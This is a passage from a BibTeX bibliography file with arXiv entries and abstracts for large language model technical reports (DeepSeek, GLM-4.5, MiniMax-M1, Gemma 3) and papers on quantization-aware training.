	eprinttype = {arxiv},
	eprint = {2301.04655 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Machine Learning},
}

@misc{deepseek-ai_deepseek_2024,
	title = {{DeepSeek} {LLM}: Scaling Open-Source Language Models with Longtermism},
	url = {http://arxiv.org/abs/2401.02954},
	doi = {10.48550/arXiv.2401.02954},
	shorttitle = {{DeepSeek} {LLM}},
	abstract = {The rapid development of open-source large language models ({LLMs}) has been truly remarkable. However, the scaling law described in previous literature presents varying conclusions, which casts a dark cloud over scaling {LLMs}. We delve into the study of scaling laws and present our distinctive findings that facilitate scaling of large scale models in two commonly used open-source configurations, 7B and 67B. Guided by the scaling laws, we introduce {DeepSeek} {LLM}, a project dedicated to advancing open-source language models with a long-term perspective. To support the pre-training phase, we have developed a dataset that currently consists of 2 trillion tokens and is continuously expanding. We further conduct supervised fine-tuning ({SFT}) and Direct Preference Optimization ({DPO}) on {DeepSeek} {LLM} Base models, resulting in the creation of {DeepSeek} Chat models. Our evaluation results demonstrate that {DeepSeek} {LLM} 67B surpasses {LLaMA}-2 70B on various benchmarks, particularly in the domains of code, mathematics, and reasoning. Furthermore, open-ended evaluations reveal that {DeepSeek} {LLM} 67B Chat exhibits superior performance compared to {GPT}-3.5.},
	number = {{arXiv}:2401.02954},
	publisher = {{arXiv}},
	author = {{DeepSeek}-{AI} and Bi, Xiao and Chen, Deli and Chen, Guanting and Chen, Shanhuang and Dai, Damai and Deng, Chengqi and Ding, Honghui and Dong, Kai and Du, Qiushi and Fu, Zhe and Gao, Huazuo and Gao, Kaige and Gao, Wenjun and Ge, Ruiqi and Guan, Kang and Guo, Daya and Guo, Jianzhong and Hao, Guangbo and Hao, Zhewen and He, Ying and Hu, Wenjie and Huang, Panpan and Li, Erhang and Li, Guowei and Li, Jiashi and Li, Yao and Li, Y. K. and Liang, Wenfeng and Lin, Fangyun and Liu, A. X. and Liu, Bo and Liu, Wen and Liu, Xiaodong and Liu, Xin and Liu, Yiyuan and Lu, Haoyu and Lu, Shanghao and Luo, Fuli and Ma, Shirong and Nie, Xiaotao and Pei, Tian and Piao, Yishi and Qiu, Junjie and Qu, Hui and Ren, Tongzheng and Ren, Zehui and Ruan, Chong and Sha, Zhangli and Shao, Zhihong and Song, Junxiao and Su, Xuecheng and Sun, Jingxiang and Sun, Yaofeng and Tang, Minghui and Wang, Bingxuan and Wang, Peiyi and Wang, Shiyu and Wang, Yaohui and Wang, Yongji and Wu, Tong and Wu, Y. and Xie, Xin and Xie, Zhenda and Xie, Ziwei and Xiong, Yiliang and Xu, Hanwei and Xu, R. X. and Xu, Yanhong and Yang, Dejian and You, Yuxiang and Yu, Shuiping and Yu, Xingkai and Zhang, B. and Zhang, Haowei and Zhang, Lecong and Zhang, Liyue and Zhang, Mingchuan and Zhang, Minghua and Zhang, Wentao and Zhang, Yichao and Zhao, Chenggang and Zhao, Yao and Zhou, Shangyan and Zhou, Shunfeng and Zhu, Qihao and Zou, Yuheng},
	urldate = {2025-08-30},
	date = {2024-01-05},
	eprinttype = {arxiv},
	eprint = {2401.02954 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{deepseek-ai_deepseek-v2_2024,
	title = {{DeepSeek}-V2: A Strong, Economical, and Efficient Mixture-of-Experts Language Model},
	url = {http://arxiv.org/abs/2405.04434},
	doi = {10.48550/arXiv.2405.04434},
	shorttitle = {{DeepSeek}-V2},
	abstract = {We present {DeepSeek}-V2, a strong Mixture-of-Experts ({MoE}) language model characterized by economical training and efficient inference. It comprises 236B total parameters, of which 21B are activated for each token, and supports a context length of 128K tokens. {DeepSeek}-V2 adopts innovative architectures including Multi-head Latent Attention ({MLA}) and {DeepSeekMoE}. {MLA} guarantees efficient inference through significantly compressing the Key-Value ({KV}) cache into a latent vector, while {DeepSeekMoE} enables training strong models at an economical cost through sparse computation. Compared with {DeepSeek} 67B, {DeepSeek}-V2 achieves significantly stronger performance, and meanwhile saves 42.5\% of training costs, reduces the {KV} cache by 93.3\%, and boosts the maximum generation throughput to 5.76 times. We pretrain {DeepSeek}-V2 on a high-quality and multi-source corpus consisting of 8.1T tokens, and further perform Supervised Fine-Tuning ({SFT}) and Reinforcement Learning ({RL}) to fully unlock its potential. Evaluation results show that, even with only 21B activated parameters, {DeepSeek}-V2 and its chat versions still achieve top-tier performance among open-source models.},
	number = {{arXiv}:2405.04434},
	publisher = {{arXiv}},
	author = {{DeepSeek}-{AI} and Liu, Aixin and Feng, Bei and Wang, Bin and Wang, Bingxuan and Liu, Bo and Zhao, Chenggang and Dengr, Chengqi and Ruan, Chong and Dai, Damai and Guo, Daya and Yang, Dejian and Chen, Deli and Ji, Dongjie and Li, Erhang and Lin, Fangyun and Luo, Fuli and Hao, Guangbo and Chen, Guanting and Li, Guowei and Zhang, H. and Xu, Hanwei and Yang, Hao and Zhang, Haowei and Ding, Honghui and Xin, Huajian and Gao, Huazuo and Li, Hui and Qu, Hui and Cai, J. L. and Liang, Jian and Guo, Jianzhong and Ni, Jiaqi and Li, Jiashi and Chen, Jin and Yuan, Jingyang and Qiu, Junjie and Song, Junxiao and Dong, Kai and Gao, Kaige and Guan, Kang and Wang, Lean and Zhang, Lecong and Xu, Lei and Xia, Leyi and Zhao, Liang and Zhang, Liyue and Li, Meng and Wang, Miaojun and Zhang, Mingchuan and Zhang, Minghua and Tang, Minghui and Li, Mingming and Tian, Ning and Huang, Panpan and Wang, Peiyi and Zhang, Peng and Zhu, Qihao and Chen, Qinyu and Du, Qiushi and Chen, R. J. and Jin, R. L. and Ge, Ruiqi and Pan, Ruizhe and Xu, Runxin and Chen, Ruyi and Li, S. S. and Lu, Shanghao and Zhou, Shangyan and Chen, Shanhuang and Wu, Shaoqing and Ye, Shengfeng and Ma, Shirong and Wang, Shiyu and Zhou, Shuang and Yu, Shuiping and Zhou, Shunfeng and Zheng, Size and Wang, T. and Pei, Tian and Yuan, Tian and Sun, Tianyu and Xiao, W. L. and Zeng, Wangding and An, Wei and Liu, Wen and Liang, Wenfeng and Gao, Wenjun and Zhang, Wentao and Li, X. Q. and Jin, Xiangyue and Wang, Xianzu and Bi, Xiao and Liu, Xiaodong and Wang, Xiaohan and Shen, Xiaojin and Chen, Xiaokang and Chen, Xiaosha and Nie, Xiaotao and Sun, Xiaowen and Wang, Xiaoxiang and Liu, Xin and Xie, Xin and Yu, Xingkai and Song, Xinnan and Zhou, Xinyi and Yang, Xinyu and Lu, Xuan and Su, Xuecheng and Wu, Y. and Li, Y. K. and Wei, Y. X. and Zhu, Y. X. and Xu, Yanhong and Huang, Yanping and Li, Yao and Zhao, Yao and Sun, Yaofeng and Li, Yaohui and Wang, Yaohui and Zheng, Yi and Zhang, Yichao and Xiong, Yiliang and Zhao, Yilong and He, Ying and Tang, Ying and Piao, Yishi and Dong, Yixin and Tan, Yixuan and Liu, Yiyuan and Wang, Yongji and Guo, Yongqiang and Zhu, Yuchen and Wang, Yuduan and Zou, Yuheng and Zha, Yukun and Ma, Yunxian and Yan, Yuting and You, Yuxiang and Liu, Yuxuan and Ren, Z. Z. and Ren, Zehui and Sha, Zhangli and Fu, Zhe and Huang, Zhen and Zhang, Zhen and Xie, Zhenda and Hao, Zhewen and Shao, Zhihong and Wen, Zhiniu and Xu, Zhipeng and Zhang, Zhongyu and Li, Zhuoshu and Wang, Zihan and Gu, Zihui and Li, Zilin and Xie, Ziwei},
	urldate = {2025-08-30},
	date = {2024-06-19},
	eprinttype = {arxiv},
	eprint = {2405.04434 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language},
}

@misc{deepseek-ai_deepseek-v3_2025,
	title = {{DeepSeek}-V3 Technical Report},
	url = {http://arxiv.org/abs/2412.19437},
	doi = {10.48550/arXiv.2412.19437},
	abstract = {We present {DeepSeek}-V3, a strong Mixture-of-Experts ({MoE}) language model with 671B total parameters with 37B activated for each token. To achieve efficient inference and cost-effective training, {DeepSeek}-V3 adopts Multi-head Latent Attention ({MLA}) and {DeepSeekMoE} architectures, which were thoroughly validated in {DeepSeek}-V2. Furthermore, {DeepSeek}-V3 pioneers an auxiliary-loss-free strategy for load balancing and sets a multi-token prediction training objective for stronger performance. We pre-train {DeepSeek}-V3 on 14.8 trillion diverse and high-quality tokens, followed by Supervised Fine-Tuning and Reinforcement Learning stages to fully harness its capabilities. Comprehensive evaluations reveal that {DeepSeek}-V3 outperforms other open-source models and achieves performance comparable to leading closed-source models. Despite its excellent performance, {DeepSeek}-V3 requires only 2.788M H800 {GPU} hours for its full training. In addition, its training process is remarkably stable. Throughout the entire training process, we did not experience any irrecoverable loss spikes or perform any rollbacks. The model checkpoints are available at https://github.com/deepseek-ai/{DeepSeek}-V3.},
	number = {{arXiv}:2412.19437},
	publisher = {{arXiv}},
	author = {{DeepSeek}-{AI} and Liu, Aixin and Feng, Bei and Xue, Bing and Wang, Bingxuan and Wu, Bochao and Lu, Chengda and Zhao, Chenggang and Deng, Chengqi and Zhang, Chenyu and Ruan, Chong and Dai, Damai and Guo, Daya and Yang, Dejian and Chen, Deli and Ji, Dongjie and Li, Erhang and Lin, Fangyun and Dai, Fucong and Luo, Fuli and Hao, Guangbo and Chen, Guanting and Li, Guowei and Zhang, H. and Bao, Han and Xu, Hanwei and Wang, Haocheng and Zhang, Haowei and Ding, Honghui and Xin, Huajian and Gao, Huazuo and Li, Hui and Qu, Hui and Cai, J. L. and Liang, Jian and Guo, Jianzhong and Ni, Jiaqi and Li, Jiashi and Wang, Jiawei and Chen, Jin and Chen, Jingchang and Yuan, Jingyang and Qiu, Junjie and Li, Junlong and Song, Junxiao and Dong, Kai and Hu, Kai and Gao, Kaige and Guan, Kang and Huang, Kexin and Yu, Kuai and Wang, Lean and Zhang, Lecong and Xu, Lei and Xia, Leyi and Zhao, Liang and Wang, Litong and Zhang, Liyue and Li, Meng and Wang, Miaojun and Zhang, Mingchuan and Zhang, Minghua and Tang, Minghui and Li, Mingming and Tian, Ning and Huang, Panpan and Wang, Peiyi and Zhang, Peng and Wang, Qiancheng and Zhu, Qihao and Chen, Qinyu and Du, Qiushi and Chen, R. J. and Jin, R. L. and Ge, Ruiqi and Zhang, Ruisong and Pan, Ruizhe and Wang, Runji and Xu, Runxin and Zhang, Ruoyu and Chen, Ruyi and Li, S. S. and Lu, Shanghao and Zhou, Shangyan and Chen, Shanhuang and Wu, Shaoqing and Ye, Shengfeng and Ye, Shengfeng and Ma, Shirong and Wang, Shiyu and Zhou, Shuang and Yu, Shuiping and Zhou, Shunfeng and Pan, Shuting and Wang, T. and Yun, Tao and Pei, Tian and Sun, Tianyu and Xiao, W. L. and Zeng, Wangding and Zhao, Wanjia and An, Wei and Liu, Wen and Liang, Wenfeng and Gao, Wenjun and Yu, Wenqin and Zhang, Wentao and Li, X. Q. and Jin, Xiangyue and Wang, Xianzu and Bi, Xiao and Liu, Xiaodong and Wang, Xiaohan and Shen, Xiaojin and Chen, Xiaokang and Zhang, Xiaokang and Chen, Xiaosha and Nie, Xiaotao and Sun, Xiaowen and Wang, Xiaoxiang and Cheng, Xin and Liu, Xin and Xie, Xin and Liu, Xingchao and Yu, Xingkai and Song, Xinnan and Shan, Xinxia and Zhou, Xinyi and Yang, Xinyu and Li, Xinyuan and Su, Xuecheng and Lin, Xuheng and Li, Y. K. and Wang, Y. Q. and Wei, Y. X. and Zhu, Y. X. and Zhang, Yang and Xu, Yanhong and Xu, Yanhong and Huang, Yanping and Li, Yao and Zhao, Yao and Sun, Yaofeng and Li, Yaohui and Wang, Yaohui and Yu, Yi and Zheng, Yi and Zhang, Yichao and Shi, Yifan and Xiong, Yiliang and He, Ying and Tang, Ying and Piao, Yishi and Wang, Yisong and Tan, Yixuan and Ma, Yiyang and Liu, Yiyuan and Guo, Yongqiang and Wu, Yu and Ou, Yuan and Zhu, Yuchen and Wang, Yuduan and Gong, Yue and Zou, Yuheng and He, Yujia and Zha, Yukun and Xiong, Yunfan and Ma, Yunxian and Yan, Yuting and Luo, Yuxiang and You, Yuxiang and Liu, Yuxuan and Zhou, Yuyang and Wu, Z. F. and Ren, Z. Z. and Ren, Zehui and Sha, Zhangli and Fu, Zhe and Xu, Zhean and Huang, Zhen and Zhang, Zhen and Xie, Zhenda and Zhang, Zhengyan and Hao, Zhewen and Gou, Zhibin and Ma, Zhicheng and Yan, Zhigang and Shao, Zhihong and Xu, Zhipeng and Wu, Zhiyu and Zhang, Zhongyu and Li, Zhuoshu and Gu, Zihui and Zhu, Zijia and Liu, Zijun and Li, Zilin and Xie, Ziwei and Song, Ziyang and Gao, Ziyi and Pan, Zizheng},
	urldate = {2025-08-30},
	date = {2025-02-18},
	eprinttype = {arxiv},
	eprint = {2412.19437 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language},
}

@misc{team_glm-45_2025,
	title = {{GLM}-4.5: Agentic, Reasoning, and Coding ({ARC}) Foundation Models},
	url = {http://arxiv.org/abs/2508.06471},
	doi = {10.48550/arXiv.2508.06471},
	shorttitle = {{GLM}-4.5},
	abstract = {We present {GLM}-4.5, an open-source Mixture-of-Experts ({MoE}) large language model with 355B total parameters and 32B activated parameters, featuring a hybrid reasoning method that supports both thinking and direct response modes. Through multi-stage training on 23T tokens and comprehensive post-training with expert model iteration and reinforcement learning, {GLM}-4.5 achieves strong performance across agentic, reasoning, and coding ({ARC}) tasks, scoring 70.1\% on {TAU}-Bench, 91.0\% on {AIME} 24, and 64.2\% on {SWE}-bench Verified. With much fewer parameters than several competitors, {GLM}-4.5 ranks 3rd overall among all evaluated models and 2nd on agentic benchmarks. We release both {GLM}-4.5 (355B parameters) and a compact version, {GLM}-4.5-Air (106B parameters), to advance research in reasoning and agentic {AI} systems. Code, models, and more information are available at https://github.com/zai-org/{GLM}-4.5.},
	number = {{arXiv}:2508.06471},
	publisher = {{arXiv}},
	author = {Team, {GLM}-4 5 and Zeng, Aohan and Lv, Xin and Zheng, Qinkai and Hou, Zhenyu and Chen, Bin and Xie, Chengxing and Wang, Cunxiang and Yin, Da and Zeng, Hao and Zhang, Jiajie and Wang, Kedong and Zhong, Lucen and Liu, Mingdao and Lu, Rui and Cao, Shulin and Zhang, Xiaohan and Huang, Xuancheng and Wei, Yao and Cheng, Yean and An, Yifan and Niu, Yilin and Wen, Yuanhao and Bai, Yushi and Du, Zhengxiao and Wang, Zihan and Zhu, Zilin and Zhang, Bohan and Wen, Bosi and Wu, Bowen and Xu, Bowen and Huang, Can and Zhao, Casey and Cai, Changpeng and Yu, Chao and Li, Chen and Ge, Chendi and Huang, Chenghua and Zhang, Chenhui and Xu, Chenxi and Zhu, Chenzheng and Li, Chuang and Yin, Congfeng and Lin, Daoyan and Yang, Dayong and Jiang, Dazhi and Ai, Ding and Zhu, Erle and Wang, Fei and Pan, Gengzheng and Wang, Guo and Sun, Hailong and Li, Haitao and Li, Haiyang and Hu, Haiyi and Zhang, Hanyu and Peng, Hao and Tai, Hao and Zhang, Haoke and Wang, Haoran and Yang, Haoyu and Liu, He and Zhao, He and Liu, Hongwei and Yan, Hongxi and Liu, Huan and Chen, Huilong and Li, Ji and Zhao, Jiajing and Ren, Jiamin and Jiao, Jian and Zhao, Jiani and Yan, Jianyang and Wang, Jiaqi and Gui, Jiayi and Zhao, Jiayue and Liu, Jie and Li, Jijie and Li, Jing and Lu, Jing and Wang, Jingsen and Yuan, Jingwei and Li, Jingxuan and Du, Jingzhao and Du, Jinhua and Liu, Jinxin and Zhi, Junkai and Gao, Junli and Wang, Ke and Yang, Lekang and Xu, Liang and Fan, Lin and Wu, Lindong and Ding, Lintao and Wang, Lu and Zhang, Man and Li, Minghao and Xu, Minghuan and Zhao, Mingming and Zhai, Mingshu and Du, Pengfan and Dong, Qian and Lei, Shangde and Tu, Shangqing and Yang, Shangtong and Lu, Shaoyou and Li, Shijie and Li, Shuang and Shuang-Li and Yang, Shuxun and Yi, Sibo and Yu, Tianshu and Tian, Wei and Wang, Weihan and Yu, Wenbo and Tam, Weng Lam and Liang, Wenjie and Liu, Wentao and Wang, Xiao and Jia, Xiaohan and Gu, Xiaotao and Ling, Xiaoying and Wang, Xin and Fan, Xing and Pan, Xingru and Zhang, Xinyuan and Zhang, Xinze and Fu, Xiuqing and Zhang, Xunkai and Xu, Yabo and Wu, Yandong and Lu, Yida and Wang, Yidong and Zhou, Yilin and Pan, Yiming and Zhang, Ying and Wang, Yingli and Li, Yingru and Su, Yinpei and Geng, Yipeng and Zhu, Yitong and Yang, Yongkun and Li, Yuhang and Wu, Yuhao and Li, Yujiang and Liu, Yunan and Wang, Yunqing and Li, Yuntao and Zhang, Yuxuan and Liu, Zezhen and Yang, Zhen and Zhou, Zhengda and Qiao, Zhongpei and Feng, Zhuoer and Liu, Zhuorui and Zhang, Zichen and Wang, Zihan and Yao, Zijun and Wang, Zikang and Liu, Ziqiang and Chai, Ziwei and Li, Zixuan and Zhao, Zuodong and Chen, Wenguang and Zhai, Jidong and Xu, Bin and Huang, Minlie and Wang, Hongning and Li, Juanzi and Dong, Yuxiao and Tang, Jie},
	urldate = {2025-08-30},
	date = {2025-08-08},
	eprinttype = {arxiv},
	eprint = {2508.06471 [cs]},
	keywords = {Computer Science - Computation and Language},
}

@misc{minimax_minimax-m1_2025,
	title = {{MiniMax}-M1: Scaling Test-Time Compute Efficiently with Lightning Attention},
	url = {http://arxiv.org/abs/2506.13585},
	doi = {10.48550/arXiv.2506.13585},
	shorttitle = {{MiniMax}-M1},
	abstract = {We introduce {MiniMax}-M1, the world's first open-weight, large-scale hybrid-attention reasoning model. {MiniMax}-M1 is powered by a hybrid Mixture-of-Experts ({MoE}) architecture combined with a lightning attention mechanism. The model is developed based on our previous {MiniMax}-Text-01 model, which contains a total of 456 billion parameters with 45.9 billion parameters activated per token. The M1 model natively supports a context length of 1 million tokens, 8x the context size of {DeepSeek} R1. Furthermore, the lightning attention mechanism in {MiniMax}-M1 enables efficient scaling of test-time compute. These properties make M1 particularly suitable for complex tasks that require processing long inputs and thinking extensively. {MiniMax}-M1 is trained using large-scale reinforcement learning ({RL}) on diverse problems including sandbox-based, real-world software engineering environments. In addition to M1's inherent efficiency advantage for {RL} training, we propose {CISPO}, a novel {RL} algorithm to further enhance {RL} efficiency. {CISPO} clips importance sampling weights rather than token updates, outperforming other competitive {RL} variants. Combining hybrid-attention and {CISPO} enables {MiniMax}-M1's full {RL} training on 512 H800 {GPUs} to complete in only three weeks, with a rental cost of just \$534,700. We release two versions of {MiniMax}-M1 models with 40K and 80K thinking budgets respectively, where the 40K model represents an intermediate phase of the 80K training. Experiments on standard benchmarks show that our models are comparable or superior to strong open-weight models such as the original {DeepSeek}-R1 and Qwen3-235B, with particular strengths in complex software engineering, tool utilization, and long-context tasks. We publicly release {MiniMax}-M1 at https://github.com/{MiniMax}-{AI}/{MiniMax}-M1.},
	number = {{arXiv}:2506.13585},
	publisher = {{arXiv}},
	author = {{MiniMax} and Chen, Aili and Li, Aonian and Gong, Bangwei and Jiang, Binyang and Fei, Bo and Yang, Bo and Shan, Boji and Yu, Changqing and Wang, Chao and Zhu, Cheng and Xiao, Chengjun and Du, Chengyu and Zhang, Chi and Qiao, Chu and Zhang, Chunhao and Du, Chunhui and Guo, Congchao and Chen, Da and Ding, Deming and Sun, Dianjun and Li, Dong and Jiao, Enwei and Zhou, Haigang and Zhang, Haimo and Ding, Han and Sun, Haohai and Feng, Haoyu and Cai, Huaiguang and Zhu, Haichao and Sun, Jian and Zhuang, Jiaqi and Cai, Jiaren and Song, Jiayuan and Zhu, Jin and Li, Jingyang and Tian, Jinhao and Liu, Jinli and Xu, Junhao and Yan, Junjie and Liu, Junteng and He, Junxian and Feng, Kaiyi and Yang, Ke and Xiao, Kecheng and Han, Le and Wang, Leyang and Yu, Lianfei and Feng, Liheng and Li, Lin and Zheng, Lin and Du, Linge and Yang, Lingyu and Zeng, Lunbin and Yu, Minghui and Tao, Mingliang and Chi, Mingyuan and Zhang, Mozhi and Lin, Mujie and Hu, Nan and Di, Nongyu and Gao, Peng and Li, Pengfei and Zhao, Pengyu and Ren, Qibing and Xu, Qidi and Li, Qile and Wang, Qin and Tian, Rong and Leng, Ruitao and Chen, Shaoxiang and Chen, Shaoyu and Shi, Shengmin and Weng, Shitong and Guan, Shuchang and Yu, Shuqi and Li, Sichen and Zhu, Songquan and Li, Tengfei and Cai, Tianchi and Liang, Tianrun and Cheng, Weiyu and Kong, Weize and Li, Wenkai and Chen, Xiancai and Song, Xiangjun and Luo, Xiao and Su, Xiao and Li, Xiaobo and Han, Xiaodong and Hou, Xinzhu and Lu, Xuan and Zou, Xun and Shen, Xuyang and Gong, Yan and Ma, Yan and Wang, Yang and Shi, Yiqi and Zhong, Yiran and Duan, Yonghong and Fu, Yongxiang and Hu, Yongyi and Gao, Yu and Fan, Yuanxiang and Yang, Yufeng and Li, Yuhao and Hu, Yulin and Huang, Yunan and Li, Yunji and Xu, Yunzhi and Mao, Yuxin and Shi, Yuxuan and Wenren, Yuze and Li, Zehan and Li, Zelin and Tian, Zhanxu and Zhu, Zhengmao and Fan, Zhenhua and Wu, Zhenzhen and Xu, Zhichao and Yu, Zhihang and Lyu, Zhiheng and Jiang, Zhuo and Gao, Zibo and Wu, Zijia and Song, Zijian and Sun, Zijun},
	urldate = {2025-08-30},
	date = {2025-06-16},
	eprinttype = {arxiv},
	eprint = {2506.13585 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{team_gemma_2025,
	title = {Gemma 3 Technical Report},
	url = {http://arxiv.org/abs/2503.19786},
	doi = {10.48550/arXiv.2503.19786},
	abstract = {We introduce Gemma 3, a multimodal addition to the Gemma family of lightweight open models, ranging in scale from 1 to 27 billion parameters. This version introduces vision understanding abilities, a wider coverage of languages and longer context - at least 128K tokens. We also change the architecture of the model to reduce the {KV}-cache memory that tends to explode with long context. This is achieved by increasing the ratio of local to global attention layers, and keeping the span on local attention short. The Gemma 3 models are trained with distillation and achieve superior performance to Gemma 2 for both pre-trained and instruction finetuned versions. In particular, our novel post-training recipe significantly improves the math, chat, instruction-following and multilingual abilities, making Gemma3-4B-{IT} competitive with Gemma2-27B-{IT} and Gemma3-27B-{IT} comparable to Gemini-1.5-Pro across benchmarks. We release all our models to the community.},
	number = {{arXiv}:2503.19786},
	publisher = {{arXiv}},
	author = {Team, Gemma and Kamath, Aishwarya and Ferret, Johan and Pathak, Shreya and Vieillard, Nino and Merhej, Ramona and Perrin, Sarah and Matejovicova, Tatiana and Ramé, Alexandre and Rivière, Morgane and Rouillard, Louis and Mesnard, Thomas and Cideron, Geoffrey and Grill, Jean-bastien and Ramos, Sabela and Yvinec, Edouard and Casbon, Michelle and Pot, Etienne and Penchev, Ivo and Liu, Gaël and Visin, Francesco and Kenealy, Kathleen and Beyer, Lucas and Zhai, Xiaohai and Tsitsulin, Anton and Busa-Fekete, Robert and Feng, Alex and Sachdeva, Noveen and Coleman, Benjamin and Gao, Yi and Mustafa, Basil and Barr, Iain and Parisotto, Emilio and Tian, David and Eyal, Matan and Cherry, Colin and Peter, Jan-Thorsten and Sinopalnikov, Danila and Bhupatiraju, Surya and Agarwal, Rishabh and Kazemi, Mehran and Malkin, Dan and Kumar, Ravin and Vilar, David and Brusilovsky, Idan and Luo, Jiaming and Steiner, Andreas and Friesen, Abe and Sharma, Abhanshu and Sharma, Abheesht and Gilady, Adi Mayrav and Goedeckemeyer, Adrian and Saade, Alaa and Feng, Alex and Kolesnikov, Alexander and Bendebury, Alexei and Abdagic, Alvin and Vadi, Amit and György, András and Pinto, André Susano and Das, Anil and Bapna, Ankur and Miech, Antoine and Yang, Antoine and Paterson, Antonia and Shenoy, Ashish and Chakrabarti, Ayan and Piot, Bilal and Wu, Bo and Shahriari, Bobak and Petrini, Bryce and Chen, Charlie and Lan, Charline Le and Choquette-Choo, Christopher A. and Carey, C. J. and Brick, Cormac and Deutsch, Daniel and Eisenbud, Danielle and Cattle, Dee and Cheng, Derek and Paparas, Dimitris and Sreepathihalli, Divyashree Shivakumar and Reid, Doug and Tran, Dustin and Zelle, Dustin and Noland, Eric and Huizenga, Erwin and Kharitonov, Eugene and Liu, Frederick and Amirkhanyan, Gagik and Cameron, Glenn and Hashemi, Hadi and Klimczak-Plucińska, Hanna and Singh, Harman and Mehta, Harsh and Lehri, Harshal Tushar and Hazimeh, Hussein and Ballantyne, Ian and Szpektor, Idan and Nardini, Ivan and Pouget-Abadie, Jean and Chan, Jetha and Stanton, Joe and Wieting, John and Lai, Jonathan and Orbay, Jordi and Fernandez, Joseph and Newlan, Josh and Ji, Ju-yeong and Singh, Jyotinder and Black, Kat and Yu, Kathy and Hui, Kevin and Vodrahalli, Kiran and Greff, Klaus and Qiu, Linhai and Valentine, Marcella and Coelho, Marina and Ritter, Marvin and Hoffman, Matt and Watson, Matthew and Chaturvedi, Mayank and Moynihan, Michael and Ma, Min and Babar, Nabila and Noy, Natasha and Byrd, Nathan and Roy, Nick and Momchev, Nikola and Chauhan, Nilay and Sachdeva, Noveen and Bunyan, Oskar and Botarda, Pankil and Caron, Paul and Rubenstein, Paul Kishan and Culliton, Phil and Schmid, Philipp and Sessa, Pier Giuseppe and Xu, Pingmei and Stanczyk, Piotr and Tafti, Pouya and Shivanna, Rakesh and Wu, Renjie and Pan, Renke and Rokni, Reza and Willoughby, Rob and Vallu, Rohith and Mullins, Ryan and Jerome, Sammy and Smoot, Sara and Girgin, Sertan and Iqbal, Shariq and Reddy, Shashir and Sheth, Shruti and Põder, Siim and Bhatnagar, Sijal and Panyam, Sindhu Raghuram and Eiger, Sivan and Zhang, Susan and Liu, Tianqi and Yacovone, Trevor and Liechty, Tyler and Kalra, Uday and Evci, Utku and Misra, Vedant and Roseberry, Vincent and Feinberg, Vlad and Kolesnikov, Vlad and Han, Woohyun and Kwon, Woosuk and Chen, Xi and Chow, Yinlam and Zhu, Yuvein and Wei, Zichuan and Egyed, Zoltan and Cotruta, Victor and Giang, Minh and Kirk, Phoebe and Rao, Anand and Black, Kat and Babar, Nabila and Lo, Jessica and Moreira, Erica and Martins, Luiz Gustavo and Sanseviero, Omar and Gonzalez, Lucas and Gleicher, Zach and Warkentin, Tris and Mirrokni, Vahab and Senter, Evan and Collins, Eli and Barral, Joelle and Ghahramani, Zoubin and Hadsell, Raia and Matias, Yossi and Sculley, D. and Petrov, Slav and Fiedel, Noah and Shazeer, Noam and Vinyals, Oriol and Dean, Jeff and Hassabis, Demis and Kavukcuoglu, Koray and Farabet, Clement and Buchatskaya, Elena and Alayrac, Jean-Baptiste and Anil, Rohan and Dmitry and Lepikhin and Borgeaud, Sebastian and Bachem, Olivier and Joulin, Armand and Andreev, Alek and Hardin, Cassidy and Dadashi, Robert and Hussenot, Léonard},
	urldate = {2025-08-30},
	date = {2025-03-25},
	langid = {english},
	eprinttype = {arxiv},
	eprint = {2503.19786 [cs]},
	keywords = {Computer Science - Artificial Intelligence, Computer Science - Computation and Language},
}

@misc{chen_scaling_2025,
	title = {Scaling Law for Quantization-Aware Training},
	url = {http://arxiv.org/abs/2505.14302},
	doi = {10.48550/arXiv.2505.14302},
	abstract = {Large language models ({LLMs}) demand substantial computational and memory resources, creating deployment challenges. Quantization-aware training ({QAT}) addresses these challenges by reducing model precision while maintaining performance. However, the scaling behavior of {QAT}, especially at 4-bit precision (W4A4), is not well understood. Existing {QAT} scaling laws often ignore key factors such as the number of training tokens and quantization granularity, which limits their applicability. This paper proposes a unified scaling law for {QAT} that models quantization error as a function of model size, training data volume, and quantization group size. Through 268 {QAT} experiments, we show that quantization error decreases as model size increases, but rises with more training tokens and coarser quantization granularity. To identify the sources of W4A4 quantization error, we decompose it into weight and activation components. Both components follow the overall trend of W4A4 quantization error, but with different sensitivities. Specifically, weight quantization error increases more rapidly with more training tokens. Further analysis shows that the activation quantization error in the {FC}2 layer, caused by outliers, is the primary bottleneck of W4A4 {QAT} quantization error. By applying mixed-precision quantization to address this bottleneck, we demonstrate that weight and activation quantization errors can converge to similar levels. Additionally, with more training data, weight quantization error eventually exceeds activation quantization error, suggesting that reducing weight quantization error is also important in such scenarios. These findings offer key insights for improving {QAT} research and development.},
	number = {{arXiv}:2505.14302},
	publisher = {{arXiv}},
	author = {Chen, Mengzhao and Zhang, Chaoyi and Liu, Jing and Zeng, Yutao and Xue, Zeyue and Liu, Zhiheng and Li, Yunshui and Ma, Jin and Huang, Jie and Zhou, Xun and Luo, Ping},
	urldate = {2025-08-30},
	date = {2025-05-20},
	eprinttype = {arxiv},
	eprint = {2505.14302 [cs]},
	keywords = {Computer Science - Computation and Language, Computer Science - Machine Learning},
}

@misc{chen_efficientqat_2025,
	title = {{EfficientQAT}: Efficient Quantization-Aware Training for Large Language Models},
	url = {http://arxiv.org/abs/2407.11062},
	doi = {10.48550/arXiv.2407.11062},
	shorttitle = {{EfficientQAT}},
	abstract = {Large language models ({LLMs}) are crucial in modern natural language processing and artificial intelligence. However, they face challenges in managing their significant memory requirements. Although quantization-aware training ({QAT}) offers a solution by reducing memory consumption through low-bit representations with minimal accuracy loss, it is impractical due to substantial training resources. To address this, we propose Efficient Quantization-Aware Training ({EfficientQAT}), a more feasible {QAT} algorithm. {EfficientQAT} involves two consecutive phases: Block-wise training of all parameters (Block-{AP}) and end-to-end training of quantization parameters (E2E-{QP}). To the best of our knowledge, Block-{AP} is the first method to enable direct training of all parameters in a block-wise manner, reducing accuracy loss in low-bit scenarios by enhancing the solution space during optimization. E2E-{QP} then trains only the quantization parameters (step sizes) end-to-end, further improving the performance of quantized models by considering interactions among all sub-modules. Extensive experiments demonstrate that {EfficientQAT} outperforms previous quantization methods across a range of models, including base {LLMs}, instruction-tuned {LLMs}, and multimodal {LLMs}, with scales from 